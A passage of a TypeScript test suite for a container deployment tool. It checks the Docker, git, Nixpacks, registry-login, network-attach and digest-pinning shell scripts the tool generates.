  it("proxy control scripts target the tugra-proxy container", () => {
    expect(buildProxyStopScript()).toBe("docker stop tugra-proxy");
    expect(buildProxyRestartScript()).toBe("docker restart tugra-proxy");
    expect(buildProxyStatusScript()).toContain("docker inspect -f '{{.State.Status}}' tugra-proxy");
    expect(buildProxyStatusScript()).toContain("|| echo absent");
    expect(buildProxyLogsScript(50)).toBe("docker logs --tail 50 tugra-proxy 2>&1");
    // tail is clamped to [1,1000]
    expect(buildProxyLogsScript(99999)).toContain("--tail 1000");
    expect(buildProxyLogsScript(0)).toContain("--tail 1");
  });

  it("builds remove + image-remove scripts", () => {
    expect(buildRemoveScript({ id: "abc" })).toContain("docker rm -f tugra_abc");
    expect(buildImageRemoveScript({ id: "abc" }, "v1")).toContain("docker rmi tugra_abc:v1");
  });

  it("GIT + Nixpacks: clones, builds to the versioned tag, runs it, no pull", () => {
    const s = buildRunScript({
      ...base,
      source: "GIT",
      image: null,
      gitUrl: "https://github.com/u/r.git",
      gitBranch: "dev",
      buildType: "NIXPACKS",
    }, "v2");
    expect(s).toContain("git clone --depth 1 --branch 'dev' -- 'https://github.com/u/r.git'");
    // plan → (jq-guarded curl/wget inject) → cached build
    expect(s).toContain("nixpacks plan -f json /etc/tugra/builds/abc > /etc/tugra/builds/abc.plan.json");
    expect(s).toContain("if command -v jq >/dev/null 2>&1; then");
    expect(s).toContain(`jq '.phases.setup.aptPkgs = ((.phases.setup.aptPkgs // []) + ["curl","wget"] | unique)'`);
    expect(s).toContain('echo "TUGRA: jq not found — skipping curl/wget health-tool injection into the Nixpacks plan" >&2');
    expect(s).toContain("nixpacks build -c /etc/tugra/builds/abc.plan.json --cache-key 'abc' --name tugra_abc:v2 /etc/tugra/builds/abc");
    // the plan file lives OUTSIDE the build context so it isn't baked into the image, and is cleaned up
    expect(s).not.toContain("/etc/tugra/builds/abc/.tugra-plan.json");
    expect(s).toContain("rm -f /etc/tugra/builds/abc.plan.json /etc/tugra/builds/abc.plan.json.tmp");
    expect(s).not.toContain("docker pull");
    expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped 'tugra_abc:v2'");
  });

  it("GIT + Dockerfile: docker build to the versioned tag", () => {
    const s = buildRunScript({
      ...base,
      source: "GIT",
      image: null,
      gitUrl: "https://x/r.git",
      buildType: "DOCKERFILE",
      dockerfilePath: "docker/Dockerfile",
    }, "v3");
    expect(s).toContain("docker build -t tugra_abc:v3 -f '/etc/tugra/builds/abc/docker/Dockerfile'");
    expect(s).not.toContain("nixpacks");
  });

  it("GIT + STATIC with a build command: node build stage → nginx, no nixpacks", () => {
    const s = buildRunScript({
      ...base,
      source: "GIT",
      image: null,
      gitUrl: "https://x/r.git",
      buildType: "STATIC",
      buildCommand: "npm run build",
      outputDir: "dist",
    }, "v4");
    const df = Buffer.from(s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/builds\/abc\/Dockerfile\.tugra/)![1], "base64").toString();
    expect(df).toContain("FROM node:20-alpine AS build");
    expect(df).toContain("RUN npm run build");
    expect(df).toContain("FROM nginx:alpine");
    expect(df).toContain("COPY --from=build /app/dist /usr/share/nginx/html");
    expect(s).toContain("docker build -t tugra_abc:v4 -f /etc/tugra/builds/abc/Dockerfile.tugra");
    expect(s).not.toContain("nixpacks");
  });

  it("GIT + STATIC without a build command: single-stage nginx copy", () => {
    const s = buildRunScript({
      ...base,
      source: "GIT",
      image: null,
      gitUrl: "https://x/r.git",
      buildType: "STATIC",
      outputDir: "public",
    }, "v5");
    const df = Buffer.from(s.match(/printf %s '([A-Za-z0-9+/=]+)' \| base64 -d > \/etc\/tugra\/builds\/abc\/Dockerfile\.tugra/)![1], "base64").toString();
    expect(df).not.toContain("FROM node");
    expect(df).toContain("FROM nginx:alpine");
    expect(df).toContain("COPY public /usr/share/nginx/html");
  });

  describe("registry push", () => {
    it("registryImageRef builds [host/]namespace/tugra_<id>:<v>, trimming slashes", () => {
      expect(registryImageRef({ url: "ghcr.io", imagePrefix: "myorg" }, { id: "abc" }, "v1")).toBe("ghcr.io/myorg/tugra_abc:v1");
      // Docker Hub: no host component
      expect(registryImageRef({ url: null, imagePrefix: "myuser" }, { id: "abc" }, "v1")).toBe("myuser/tugra_abc:v1");
      // trailing slashes trimmed
      expect(registryImageRef({ url: "reg.example.com/", imagePrefix: "team/" }, { id: "abc" }, "v2")).toBe("reg.example.com/team/tugra_abc:v2");
    });

    it("registryImageRef falls back to the username when no imagePrefix (a bare ref hits the unwritable library/ namespace)", () => {
      // Docker Hub with no prefix → username namespace (not a bare, unpushable tugra_abc)
      expect(registryImageRef({ url: null, imagePrefix: null, username: "me" }, { id: "abc" }, "v1")).toBe("me/tugra_abc:v1");
      // ghcr/gitlab with a host but no prefix → host/username
      expect(registryImageRef({ url: "ghcr.io", imagePrefix: null, username: "me" }, { id: "abc" }, "v1")).toBe("ghcr.io/me/tugra_abc:v1");
      // an explicit imagePrefix still wins over the username
      expect(registryImageRef({ url: "ghcr.io", imagePrefix: "myorg", username: "me" }, { id: "abc" }, "v1")).toBe("ghcr.io/myorg/tugra_abc:v1");
    });

    it("buildRegistryPushSteps tags + pushes via stdin login (token never in argv)", () => {
      const steps = buildRegistryPushSteps("tugra_abc:v1", "ghcr.io/org/tugra_abc:v1", { url: "ghcr.io", user: "bot", token: "s3cr3t" }).join("\n");
      expect(steps).toContain("docker tag tugra_abc:v1 'ghcr.io/org/tugra_abc:v1'");
      expect(steps).toContain("docker push 'ghcr.io/org/tugra_abc:v1'");
      expect(steps).toContain("docker --config \"$sd\" login 'ghcr.io' -u 'bot' --password-stdin");
      expect(steps).not.toContain("s3cr3t"); // the token is base64+stdin, never inlined
    });

    it("prepSteps appends the push after building (GIT) when registryPush is set", () => {
      const s = buildRunScript(
        {
          ...base,
          source: "GIT",
          image: null,
          gitUrl: "https://x/r.git",
          buildType: "NIXPACKS",
          registryPush: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, tag: "ghcr.io/org/tugra_abc:v1" },
        },
        "v1",
      );
      expect(s).toContain("nixpacks build -c"); // built first
      expect(s).toContain("docker tag tugra_abc:v1 'ghcr.io/org/tugra_abc:v1'");
      expect(s).toContain("docker push 'ghcr.io/org/tugra_abc:v1'");
    });

    it("a rollback (build=false) does NOT push (prepSteps skipped)", () => {
      const s = buildRunScript(
        { ...base, registryPush: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, tag: "ghcr.io/org/tugra_abc:v1" } },
        "v1",
        false,
      );
      expect(s).not.toContain("docker push");
    });

    it("registryPull makes the deploy PULL a ref + tag it locally instead of building (no clone/build)", () => {
      const s = buildRunScript(
        {
          ...base,
          source: "GIT",
          image: null,
          gitUrl: "https://x/r.git",
          buildType: "NIXPACKS",
          registryPull: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, ref: "ghcr.io/org/tugra_abc:v1" },
        },
        "v1",
      );
      // pulls the ref and snapshots it to the local versioned tag
      expect(s).toContain("docker pull 'ghcr.io/org/tugra_abc:v1'");
      expect(s).toContain("docker tag 'ghcr.io/org/tugra_abc:v1' tugra_abc:v1");
      expect(s).toContain("docker --config \"$sd\" login 'ghcr.io' -u 'bot' --password-stdin");
      // NO build/clone happened (registryPull short-circuits prepSteps)
      expect(s).not.toContain("git clone");
      expect(s).not.toContain("nixpacks build");
      expect(s).not.toContain("docker push"); // pull path never pushes
      // and it still runs the container
      expect(s).toContain("docker run -d --name tugra_abc --restart unless-stopped 'tugra_abc:v1'");
    });

    it("buildBuildOnlyScript builds + pushes but does NOT run (for a build server)", () => {
      const s = buildBuildOnlyScript(
        {
          ...base,
          source: "GIT",
          image: null,
          gitUrl: "https://x/r.git",
          buildType: "NIXPACKS",
          registryPush: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, tag: "ghcr.io/org/tugra_abc:v1" },
        },
        "v1",
      );
      expect(s).toContain("nixpacks build -c"); // builds
      expect(s).toContain("docker push 'ghcr.io/org/tugra_abc:v1'"); // and pushes
      expect(s).not.toContain("docker run -d"); // but never runs the container
    });

    it("a private GIT clone + registry push cleans up BOTH secrets dirs (cumulative trap, no orphaned token)", () => {
      const s = buildRunScript(
        {
          ...base,
          source: "GIT",
          image: null,
          gitUrl: "https://github.com/u/r.git",
          gitToken: "ghp_token",
          buildType: "NIXPACKS",
          registryPush: { auth: { url: "ghcr.io", user: "bot", token: "tok" }, tag: "ghcr.io/org/tugra_abc:v1" },
        },
        "v1",
      );
      // two secrets dirs are created (git askpass + registry login) and both are accumulated
      expect((s.match(/TUGRA_SEC_DIRS="\$\{TUGRA_SEC_DIRS:\+\$TUGRA_SEC_DIRS \}\$sd"/g) || []).length).toBe(2);
      // a single cumulative trap wipes all of them — never the old single-dir form that a
      // second prelude would clobber, orphaning the plaintext git token on disk
      expect(s).toContain("trap 'rm -rf $TUGRA_SEC_DIRS' EXIT");
      expect(s).not.toContain(`trap 'rm -rf "$sd"' EXIT`);
    });
  });
});

describe("static helpers", () => {
  it("staticNginxConf falls back to index.html for SPA routes", () => {
    expect(staticNginxConf()).toContain("try_files $uri $uri/ /index.html");
  });

  it("staticDockerfile defaults the output dir to dist", () => {
    expect(staticDockerfile("npm run build")).toContain("COPY --from=build /app/dist");
  });
});

describe("infra image digest pinning", () => {
  // Guards against a future edit dropping the @sha256 pin (supply-chain regression).
  it("pins the health-probe image to a tag + sha256 digest", () => {
    expect(HEALTH_PROBE_IMAGE).toMatch(/^curlimages\/curl:[\w.]+@sha256:[a-f0-9]{64}$/);
  });
  it("pins the reverse-proxy image to a tag + sha256 digest", () => {
    expect(PROXY_IMAGE).toMatch(/^traefik:[\w.]+@sha256:[a-f0-9]{64}$/);
  });
});

describe("placement expression builders", () => {
  it("constraintExpr renders each type + both operators", () => {
    expect(constraintExpr({ type: "hostname", op: "eq", value: "web-1" })).toBe("node.hostname==web-1");
    expect(constraintExpr({ type: "hostname", op: "ne", value: "web-1" })).toBe("node.hostname!=web-1");
    expect(constraintExpr({ type: "nodeId", op: "eq", value: "abc123" })).toBe("node.id==abc123");
    expect(constraintExpr({ type: "role", op: "eq", value: "manager" })).toBe("node.role==manager");
    expect(constraintExpr({ type: "label", op: "eq", key: "zone", value: "east" })).toBe("node.labels.zone==east");
  });
  it("spreadPrefExpr renders a spread over a label key", () => {
    expect(spreadPrefExpr("zone")).toBe("spread=node.labels.zone");
  });
});

describe("dbNetwork — managed-DB network attach (S4d-4)", () => {
  const domained: AppSpec = { ...base, domain: "app.example.com" };

  it("default app (dbNetwork off): the deploy script never mentions the DB network", () => {
    const s = buildRunScript(domained, "v1");
    expect(s).not.toContain("tugra-net");
    expect(s).not.toContain("network connect");
  });

  it("byte-identical: dbNetwork false === undefined (no drift for default apps)", () => {
    expect(buildRunScript({ ...domained, dbNetwork: false }, "v1")).toBe(buildRunScript(domained, "v1"));
  });

  it("no-domain opt-in: runs ON tugra-net as the sole network (+ host-port), no proxy/labels, no connect", () => {
    const s = buildRunScript({ ...base, dbNetwork: true, hostPort: 8080 }, "v1");
    expect(s).toContain("docker network create tugra-net");
    expect(s).toMatch(/--network tugra-net/);
    expect(s).toContain("-p 8080:80");
    expect(s).not.toContain("tugra-proxy");
    expect(s).not.toContain("network connect"); // single --network at run → no connect needed
  });

  it("domain opt-in: stays on tugra-proxy for ingress, pins Traefik to it, and ATTACHES tugra-net after create", () => {
    const s = buildRunScript({ ...domained, dbNetwork: true }, "v1");
    expect(s).toContain("--network tugra-proxy");
    expect(s).toContain("traefik.docker.network=tugra-proxy");
    expect(s).toMatch(/&& docker network connect tugra-net \S+/);
    expect(s).toContain("docker network create tugra-net");
  });

  it("the run+connect chain cleans up and fails hard on any error (set -e cannot be bypassed by the && list)", () => {
    const s = buildRunScript({ ...domained, dbNetwork: true }, "v1");
    // `... || { docker rm -f <name> 2>/dev/null; false; }` — a failed run OR connect removes the container and
    // ends non-zero, so a bare use aborts under set -e and an `if`-gate takes its failure branch.
    expect(s).toMatch(/\|\| \{ docker rm -f \S+ 2>\/dev\/null; false; \}/);
  });

  it("creates the DB network BEFORE the container that joins it", () => {
    const s = buildRunScript({ ...domained, dbNetwork: true }, "v1");
    expect(s.indexOf("docker network create tugra-net")).toBeLessThan(s.indexOf("docker run -d"));
  });

  it("rolling deploy propagates dbNetwork to the rollout container (rApp spread) and still attaches tugra-net", () => {
    const gate = { retries: 10, intervalSec: 3, startPeriodSec: 5 };
    const s = buildRollingDeployScript({ ...domained, dbNetwork: true }, "v2", { probe: { kind: "stableWait" }, ...gate });
    expect(s).toContain("docker network create tugra-net");
    expect(s).toMatch(/&& docker network connect tugra-net \S+/);
  });
});
